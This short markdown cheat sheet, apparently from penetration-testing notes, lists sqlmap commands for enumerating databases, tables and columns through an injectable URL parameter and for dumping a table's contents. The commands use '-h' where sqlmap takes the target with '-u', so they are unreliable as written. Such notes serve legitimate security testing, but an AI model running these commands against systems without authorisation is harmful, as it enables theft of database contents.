## Injectable parameter Found

### Show Databases
`sqlmap -h <url with injectable parameter> [--cookie values] --dbs`

### Show Tables
`sqlmap -h <url with injectable parameter> [--cookie values] -D <database> --tables`

### Show Columns
`sqlmap -h <url with injectable parameter> [--cookie values] -D <database> -T <table> --columns`

### Dump a Table
`sqlmap -h <url with injectable parameter> [--cookie values] -D <database> -T <table> --dump`
